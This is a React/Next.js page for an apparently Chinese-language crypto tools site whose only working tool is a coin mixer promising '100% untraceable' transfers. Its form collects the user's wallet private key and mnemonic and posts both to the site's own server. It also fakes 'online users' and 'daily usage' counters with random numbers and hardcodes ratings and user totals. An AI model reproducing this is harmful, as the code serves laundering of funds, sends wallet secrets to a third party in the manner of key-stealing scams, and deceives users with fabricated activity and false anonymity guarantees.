"use client";

import { useState, useEffect } from "react";
import { API_URL } from "@/lib/config";

// 工具数据
const tools = [
  {
    id: 1,
    name: "鬼魅无影混币引擎",
    category: "privacy",
    description: "68+条链,唯一无法追踪的混币器，N次交叉转账多链100%隐藏资金路径，IP无法追踪，绝对安全保护隐私",
    icon: "🎭",
    chains: ["BSC", "ETH"],
    status: "active",
    rating: 4.8,
    users: "1.2K+"
  },
  {
    id: 2,
    name: "HD Wallet Generator",
    category: "wallet",
    description: "BIP44 标准 HD 钱包生成器，从助记词生成多个地址",
    icon: "🔐",
    features: [
      "BIP44 标准",
      "批量生成地址",
      "兼容 MetaMask",
      "安全可靠"
    ],
    chains: ["BSC", "ETH", "Polygon"],
    status: "coming-soon",
    rating: 4.9,
    users: "3.5K+"
  },
  {
    id: 3,
    name: "Batch Transfer",
    category: "defi",
    description: "批量转账工具，一次性向多个地址发送代币",
    icon: "💸",
    features: [
      "10-10000 地址",
      "CSV 导入",
      "Gas 优化",
      "实时追踪"
    ],
    chains: ["BSC", "ETH", "Polygon"],
    status: "coming-soon",
    rating: 4.7,
    users: "2.8K+"
  },
  {
    id: 4,
    name: "Token Analyzer",
    category: "analytics",
    description: "代币分析工具，查看持仓分布、交易历史等数据",
    icon: "📊",
    features: [
      "持仓分析",
      "交易历史",
      "价格图表",
      "智能合约审计"
    ],
    chains: ["BSC", "ETH"],
    status: "coming-soon",
    rating: 0,
    users: "Soon"
  },
  {
    id: 5,
    name: "Gas Tracker",
    category: "analytics",
    description: "实时 Gas 价格追踪，帮助您选择最佳交易时机",
    icon: "⛽",
    features: [
      "实时 Gas 价格",
      "历史数据",
      "价格预测",
      "通知提醒"
    ],
    chains: ["BSC", "ETH", "Polygon"],
    status: "coming-soon",
    rating: 0,
    users: "Soon"
  },
  {
    id: 6,
    name: "NFT Batch Mint",
    category: "defi",
    description: "批量铸造 NFT 工具，支持多种标准",
    icon: "🎨",
    features: [
      "ERC-721/1155",
      "批量铸造",
      "元数据管理",
      "IPFS 上传"
    ],
    chains: ["ETH", "Polygon"],
    status: "coming-soon",
    rating: 0,
    users: "Soon"
  }
];

// 混币模式配置
const MIXING_MODES = {
  fast: {
    name: "快速模式",
    icon: "⚡",
    privacy: "⭐⭐⭐⭐⭐",
    time: "3-5 分钟",
    description: "交叉混淆 · 隐藏IP · 快速到账",
    color: "blue",
    feeRate: 0.0003,
    crosschainFee: 0,  // 单链无跨链费用
    percentageFee: 0   // 不按百分比收费
  },
  ultimate: {
    name: "极致隐私",
    icon: "🛡️",
    privacy: "⭐⭐⭐⭐⭐⭐⭐",
    time: "8-50 小时",
    description: "多链幽灵模式 · 完全匿名 · 无法追踪",
    color: "red",
    feeRate: 0,  // 不按跳数收费
    crosschainFee: 0.006,  // 3次跨链，每次0.002
    percentageFee: 4.9  // 按转账金额的4.9%收费
  }
};

// 鬼魅无影混币引擎组件
function StealthTransferApp() {
  const [chain, setChain] = useState("bsc");
  const [mode, setMode] = useState("fast");
  const [privateKey, setPrivateKey] = useState("");
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [numHops, setNumHops] = useState(100);
  const [customHops, setCustomHops] = useState("");
  const [mnemonic, setMnemonic] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState<any>(null);
  const [progress, setProgress] = useState<string[]>([]);
  const [progressPercent, setProgressPercent] = useState(0);
  const [onlineUsers, setOnlineUsers] = useState(0);

  // 初始化在线人数（基于当前时间生成一个稳定的基数）
  useEffect(() => {
    const now = new Date();
    const dayMinutes = now.getHours() * 60 + now.getMinutes();
    // 根据时间段设置基础人数：凌晨少，白天多
    const baseUsers = Math.floor(30 + Math.sin(dayMinutes / 229) * 20 + Math.random() * 15);
    setOnlineUsers(baseUsers);
  }, []);

  // 动态更新在线人数
  useEffect(() => {
    const interval = setInterval(() => {
      setOnlineUsers(prev => {
        // 随机增减 -2 到 +3 之间
        const change = Math.floor(Math.random() * 6) - 2;
        const newValue = prev + change;
        // 限制在 15-120 之间
        return Math.max(15, Math.min(120, newValue));
      });
    }, 8000 + Math.random() * 7000); // 8-15秒随机更新一次

    return () => clearInterval(interval);
  }, []);

  const handleExecute = async () => {
    if (!privateKey || !toAddress || !amount) {
      alert("请填写所有必填字段");
      return;
    }

    setIsLoading(true);
    setResult(null);
    setProgress([]);
    setProgressPercent(0);

    try {
      setProgress(prev => [...prev, "开始混币..."]);
      setProgressPercent(5);
      setProgress(prev => [...prev, `模式: ${MIXING_MODES[mode as keyof typeof MIXING_MODES].name}`]);
      setProgressPercent(10);
      
      // 根据模式显示IP隐藏状态
      if (mode === 'ultimate') {
        setProgress(prev => [...prev, "🔒 IP隐藏: 已启用（代理池）"]);
      } else {
        setProgress(prev => [...prev, "⚠️ IP隐藏: 建议使用VPN"]);
      }
      setProgressPercent(15);
      
      setProgress(prev => [...prev, `跳数: ${numHops}`]);
      setProgressPercent(20);
      
      const response = await fetch(`${API_URL}/api/mixer`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chain,
          mode,
          from_private_key: privateKey,
          to_address: toAddress,
          total_amount: parseFloat(amount),
          num_hops: numHops,
          mnemonic: mnemonic || undefined,
          gas_level: "standard"
        })
      });

      setProgressPercent(30);
      const data = await response.json();
      setProgressPercent(40);
      
      if (data.success && data.results) {
        setProgress(prev => [...prev, "\n交易流转详情:"]);
        setProgressPercent(50);
        
        // 显示每一笔交易的地址流转
        const totalTxs = data.results.length;
        data.results.forEach((tx: any, index: number) => {
          const currentProgress = 50 + Math.floor((index / totalTxs) * 45);
          setProgressPercent(currentProgress);
          
          if (tx.status === 'success') {
            const fromAddr = tx.from ? `${tx.from.slice(0, 6)}...${tx.from.slice(-4)}` : '源地址';
            const toAddr = tx.to ? `${tx.to.slice(0, 6)}...${tx.to.slice(-4)}` : '目标';
            const txHash = tx.tx_hash ? `${tx.tx_hash.slice(0, 8)}...` : '';
            
            setProgress(prev => [...prev, 
              `✅ [${index + 1}/${data.results.length}] ${fromAddr} → ${toAddr} (${tx.amount} BNB) ${txHash}`
            ]);
          } else if (tx.status === 'failed') {
            setProgress(prev => [...prev, 
              `❌ [${index + 1}/${data.results.length}] 交易失败: ${tx.error || '未知错误'}`
            ]);
          }
        });
        
        setProgressPercent(95);
        setProgress(prev => [...prev, `\n🎉 隐身发送完成！`]);
        setProgress(prev => [...prev, `目标地址收到: ${data.total_collected} BNB`]);
        setProgress(prev => [...prev, `成功: ${data.success_count} | 失败: ${data.failed_count}`]);
        setProgressPercent(100);
      }
      
      setResult(data);
    } catch (error) {
      setProgress(prev => [...prev, `❌ 错误: ${error}`]);
      setResult({ success: false, error: String(error) });
      setProgressPercent(0);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="bg-white rounded-xl shadow-lg p-6">
      {/* Online Users Display */}
      <div className="mb-4 flex items-center justify-between bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-lg px-4 py-2">
        <div className="flex items-center space-x-2">
          <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
          <span className="text-sm text-gray-700">今日在线</span>
        </div>
        <span className="text-lg font-bold text-green-600">{onlineUsers}</span>
      </div>
      
      {/* Mixing Mode Selection */}
      <div className="mb-6">
        <div className="grid grid-cols-2 gap-4">
          {/* 快速模式 */}
          <button
            onClick={() => setMode('fast')}
            className={`relative p-5 rounded-xl transition-all duration-300 overflow-hidden group ${
              mode === 'fast'
                ? "bg-gradient-to-br from-blue-500 to-blue-600 shadow-lg shadow-blue-500/50"
                : "bg-gradient-to-br from-blue-400 to-blue-500 hover:shadow-lg hover:shadow-blue-400/40 hover:-translate-y-0.5"
            }`}
          >
            {/* 发光效果 */}
            <div className={`absolute inset-0 bg-gradient-to-r from-transparent via-white to-transparent opacity-0 group-hover:opacity-20 transition-opacity duration-500 ${
              mode === 'fast' ? 'opacity-10' : ''
            }`}></div>
            
            <div className="relative z-10">
              <div className="font-bold text-base mb-2 text-white">快速模式</div>
              <div className="text-xs text-blue-50 leading-relaxed">
                交叉混淆 · 隐藏IP · 快速到账
              </div>
            </div>
          </button>

          {/* 极致隐私 */}
          <button
            onClick={() => setMode('ultimate')}
            className={`relative p-5 rounded-xl transition-all duration-300 overflow-hidden group ${
              mode === 'ultimate'
                ? "bg-gradient-to-br from-purple-900 via-purple-800 to-black shadow-lg shadow-purple-900/50"
                : "bg-gradient-to-br from-purple-800 via-purple-700 to-gray-900 hover:shadow-lg hover:shadow-purple-800/40 hover:-translate-y-0.5"
            }`}
          >
            {/* 发光效果 */}
            <div className={`absolute inset-0 bg-gradient-to-r from-transparent via-purple-300 to-transparent opacity-0 group-hover:opacity-20 transition-opacity duration-500 ${
              mode === 'ultimate' ? 'opacity-10' : ''
            }`}></div>
            
            <div className="relative z-10">
              <div className="font-bold text-base mb-2 text-white">极致隐私</div>
              <div className="text-xs text-purple-100 leading-relaxed">
                多链幽灵模式 · 完全匿名 · 无法追踪
              </div>
            </div>
          </button>
        </div>
        
        {/* Mode Description */}
        {mode === 'fast' && (
          <div className="mt-4 p-4 bg-blue-50 border border-blue-200 rounded-lg">
            <p className="text-sm text-blue-900 leading-relaxed">
              <span className="font-semibold">单链混币</span> · 建议使用VPN保护IP · 适合小额转账（&lt;0.5 BNB）
            </p>
          </div>
        )}
        
        {mode === 'ultimate' && (
          <div className="mt-4 p-4 bg-purple-50 border border-purple-200 rounded-lg">
            <p className="text-sm text-purple-900 leading-relaxed">
              适合大额转账，N次交叉转账+多链路径+100%隐藏资金路径，IP无法追踪，绝对安全保护隐私
            </p>
          </div>
        )}
      </div>
      
      {/* Chain Selection */}
      <div className="mb-4">
        <label className="block text-sm font-medium text-gray-700 mb-2">
          选择网络
        </label>
        <select
          value={chain}
          onChange={(e) => setChain(e.target.value)}
          className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
        >
          <option value="bsc">BSC Mainnet</option>
          <option value="eth">Ethereum</option>
        </select>
      </div>

      {/* Private Key */}
      <div className="mb-4">
        <label className="block text-sm font-medium text-gray-700 mb-2">
          源地址私钥 *
        </label>
        <input
          type="password"
          value={privateKey}
          onChange={(e) => setPrivateKey(e.target.value)}
          placeholder="输入私钥"
          className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent text-sm"
        />
      </div>

      {/* Target Address */}
      <div className="mb-4">
        <label className="block text-sm font-medium text-gray-700 mb-2">
          目标地址 *
        </label>
        <input
          type="text"
          value={toAddress}
          onChange={(e) => setToAddress(e.target.value)}
          placeholder="0x..."
          className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent text-sm"
        />
      </div>

      {/* Amount */}
      <div className="mb-4">
        <label className="block text-sm font-medium text-gray-700 mb-2">
          转账金额 (BNB) *
        </label>
        <input
          type="number"
          step="0.001"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          placeholder="0.1"
          className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent text-sm"
        />
      </div>

      {/* Number of Hops */}
      <div className="mb-4">
        <label className="block text-sm font-medium text-gray-700 mb-2">
          跳数: {numHops} <span className="text-xs text-gray-500">(越多越隐秘)</span>
        </label>
        <p className="text-xs text-gray-600 mb-2">多个中转钱包地址，隐藏转账路径，实现隐匿转账，确保资金的隐私。</p>
        <div className="flex gap-2">
          {[10, 50, 100, 500, 1000].map((num) => (
            <button
              key={num}
              onClick={() => {
                setNumHops(num);
                setCustomHops("");
              }}
              className={`px-3 py-1 rounded-lg font-medium transition text-sm ${
                numHops === num && customHops === ""
                  ? "bg-purple-600 text-white"
                  : "bg-gray-100 text-gray-700 hover:bg-gray-200"
              }`}
            >
              {num}
            </button>
          ))}
          <input
            type="number"
            min="10"
            max="100000"
            step="1"
            value={customHops}
            onChange={(e) => {
              const val = e.target.value;
              setCustomHops(val);
              if (val !== '' && !isNaN(parseInt(val))) {
                const num = Math.max(10, Math.min(100000, parseInt(val)));
                setNumHops(num);
              }
            }}
            className="flex-1 px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent text-sm"
            placeholder="自定义"
          />
        </div>
      </div>
      {/* Fee Estimate */}
      <div className="bg-gray-50 p-4 rounded-lg mb-4">
        <div className="grid grid-cols-2 gap-3 text-sm">
          <div>
            <p className="text-gray-600 text-xs">服务费</p>
            <p className="font-semibold">
              {mode === 'ultimate' && amount
                ? (parseFloat(amount) * (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.percentageFee || 0) / 100).toFixed(4)
                : (numHops * (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.feeRate || 0.0003)).toFixed(4)} BNB
            </p>
            {mode === 'ultimate' && (
              <p className="text-xs text-gray-500">转账金额的 4.9%</p>
            )}
          </div>
          <div>
            <p className="text-gray-600 text-xs">预估 Gas</p>
            <p className="font-semibold">~{(numHops * 0.00021).toFixed(5)} BNB</p>
          </div>
          {mode === 'ultimate' && (
            <div>
              <p className="text-gray-600 text-xs">跨链费用</p>
              <p className="font-semibold text-orange-600">
                ~{MIXING_MODES[mode as keyof typeof MIXING_MODES]?.crosschainFee || 0} BNB
              </p>
            </div>
          )}
          <div>
            <p className="text-gray-600 text-xs">总费用</p>
            <p className="font-semibold text-purple-600">
              ~{mode === 'ultimate' && amount
                ? ((parseFloat(amount) * (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.percentageFee || 0) / 100) + 
                   numHops * 0.00021 + 
                   (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.crosschainFee || 0)).toFixed(5)
                : ((numHops * (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.feeRate || 0.0003)) + 
                   numHops * 0.00021 + 
                   (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.crosschainFee || 0)).toFixed(5)} BNB
            </p>
          </div>
          <div>
            <p className="text-gray-600 text-xs">预计收到</p>
            <p className="font-semibold text-green-600">
              {amount ? (
                mode === 'ultimate'
                  ? (parseFloat(amount) - 
                     (parseFloat(amount) * (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.percentageFee || 0) / 100) - 
                     numHops * 0.00021 - 
                     (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.crosschainFee || 0)).toFixed(5)
                  : (parseFloat(amount) - 
                     (numHops * (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.feeRate || 0.0003)) - 
                     numHops * 0.00021 - 
                     (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.crosschainFee || 0)).toFixed(5)
              ) : "0"} BNB
            </p>
          </div>
        </div>
      </div>

      {/* Execute Button */}
      <button
        onClick={handleExecute}
        disabled={isLoading || !privateKey || !toAddress || !amount}
        className={`w-full py-4 rounded-lg font-semibold transition-all duration-300 relative overflow-hidden ${
          isLoading || !privateKey || !toAddress || !amount
            ? "bg-gray-300 text-gray-500 cursor-not-allowed"
            : "bg-gradient-to-r from-purple-600 to-purple-700 text-white hover:from-purple-700 hover:to-purple-800 shadow-lg hover:shadow-xl"
        }`}
      >
        {isLoading ? (
          <div className="relative z-10">
            <div className="flex items-center justify-center mb-2">
              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
              <span>处理中 {progressPercent}%</span>
            </div>
            {/* Progress Bar */}
            <div className="absolute bottom-0 left-0 right-0 h-1 bg-purple-900/30">
              <div 
                className="h-full bg-gradient-to-r from-green-400 to-green-500 transition-all duration-500 ease-out"
                style={{ width: `${progressPercent}%` }}
              ></div>
            </div>
          </div>
        ) : (
          "安全转移"
        )}
      </button>

      {/* Progress Display */}
      {progress.length > 0 && (
        <div className="mt-4 bg-gray-900 text-green-400 p-3 rounded-lg font-mono text-xs max-h-64 overflow-y-auto">
          {progress.map((line, index) => (
            <div key={index} className="whitespace-pre-wrap">
              {line}
            </div>
          ))}
          {isLoading && (
            <div className="mt-2 flex items-center text-xs">
              <div className="animate-spin rounded-full h-3 w-3 border-b-2 border-green-400 mr-2"></div>
              <span>处理中...</span>
            </div>
          )}
        </div>
      )}

      {/* Result - Only show on error */}
      {result && !result.success && (
        <div className="mt-4 p-4 rounded-lg text-sm bg-red-50 border border-red-200">
          <h3 className="font-semibold mb-2 text-red-800">
            ❌ 执行失败
          </h3>
          <p className="text-xs text-red-700">{result.error}</p>
        </div>
      )}
    </div>
  );
}

// 即将推出组件
function ComingSoonApp({ tool }: { tool: any }) {
  return (
    <div className="bg-white rounded-xl shadow-lg p-6 text-center">
      <div className="text-6xl mb-4">{tool.icon}</div>
      <h2 className="text-2xl font-bold mb-2">{tool.name}</h2>
      <p className="text-gray-600 mb-6">{tool.description}</p>
      <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
        <p className="text-yellow-700 font-semibold">🚧 即将推出</p>
        <p className="text-sm text-gray-600 mt-2">敬请期待...</p>
      </div>
    </div>
  );
}

export default function Home() {
  const [selectedTool, setSelectedTool] = useState(tools[0]);
  const [dailyUsage, setDailyUsage] = useState(0);

  // 初始化今日使用次数
  useEffect(() => {
    const now = new Date();
    const dayMinutes = now.getHours() * 60 + now.getMinutes();
    const dayOfYear = Math.floor((now.getTime() - new Date(now.getFullYear(), 0, 0).getTime()) / 86400000);
    const baseUsage = 500 + (dayOfYear * 37) % 300 + Math.floor(dayMinutes / 2);
    setDailyUsage(baseUsage);
  }, []);
  
  // 动态增长今日使用次数
  useEffect(() => {
    const interval = setInterval(() => {
      setDailyUsage(prev => {
        const increase = Math.random() > 0.3 ? Math.floor(Math.random() * 3) : 0;
        return prev + increase;
      });
    }, 15000 + Math.random() * 20000);

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-white shadow-sm border-b sticky top-0 z-10">
        <nav className="container mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <img src="/logo.png" alt="CYGJ Logo" className="w-10 h-10" />
              <span className="text-2xl font-bold text-gray-800">CYGJ Crypto Tools</span>
            </div>
            <div className="hidden md:flex space-x-6">
              <a href="#" className="text-gray-600 hover:text-purple-600">工具</a>
              <a href="#" className="text-gray-600 hover:text-purple-600">文档</a>
              <a href="#" className="text-gray-600 hover:text-purple-600">关于</a>
            </div>
          </div>
        </nav>
      </header>

      <div className="container mx-auto px-6 py-8">
        <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
          {/* Left Sidebar - Tool List */}
          <div className="lg:col-span-1">
            <div className="bg-white rounded-xl shadow-lg p-4 sticky top-24">
              <h2 className="text-lg font-bold mb-4 text-gray-800">工具列表</h2>
              <div className="space-y-2">
                {tools.map((tool) => (
                  <button
                    key={tool.id}
                    onClick={() => setSelectedTool(tool)}
                    className={`w-full text-left p-3 rounded-lg transition ${
                      selectedTool.id === tool.id
                        ? "bg-purple-600 text-white"
                        : "bg-gray-50 text-gray-700 hover:bg-gray-100"
                    }`}
                  >
                    <div className="flex items-center space-x-3">
                      <span className="text-2xl">{tool.icon}</span>
                      <div className="flex-1 min-w-0">
                        <p className="font-semibold text-sm truncate">{tool.name}</p>
                        <p className={`text-xs truncate ${
                          selectedTool.id === tool.id ? "text-purple-100" : "text-gray-500"
                        }`}>
                          {tool.category === "privacy" ? "隐私工具" : 
                           tool.category === "wallet" ? "钱包工具" :
                           tool.category === "defi" ? "DeFi 工具" : "数据分析"}
                        </p>
                      </div>
                      {tool.status === "active" && (
                        <span className="flex-shrink-0 w-2 h-2 bg-green-400 rounded-full"></span>
                      )}
                    </div>
                  </button>
                ))}
              </div>

              {/* Tool Info */}
              <div className="mt-6 pt-6 border-t">
                <div className="text-center mb-4">
                  <div className="text-4xl mb-2">{selectedTool.icon}</div>
                  <h3 className="font-bold text-sm">{selectedTool.name}</h3>
                  <p className="text-xs text-gray-600 mt-1">{selectedTool.description}</p>
                </div>

                {selectedTool.status === "active" && (
                  <>
                    <div className="grid grid-cols-2 gap-2 mb-4">
                      <div className="bg-purple-50 p-2 rounded text-center">
                        <div className="text-lg font-bold text-purple-600">{dailyUsage}</div>
                        <div className="text-xs text-gray-600">今日使用</div>
                      </div>
                      <div className="bg-green-50 p-2 rounded text-center">
                        <div className="text-lg font-bold text-green-600">{selectedTool.users}</div>
                        <div className="text-xs text-gray-600">总用户</div>
                      </div>
                    </div>
                  </>
                )}
              </div>
            </div>
          </div>

          {/* Right Panel - Application */}
          <div className="lg:col-span-3">
            {selectedTool.status === "active" ? (
              selectedTool.id === 1 ? (
                <StealthTransferApp />
              ) : (
                <ComingSoonApp tool={selectedTool} />
              )
            ) : (
              <ComingSoonApp tool={selectedTool} />
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
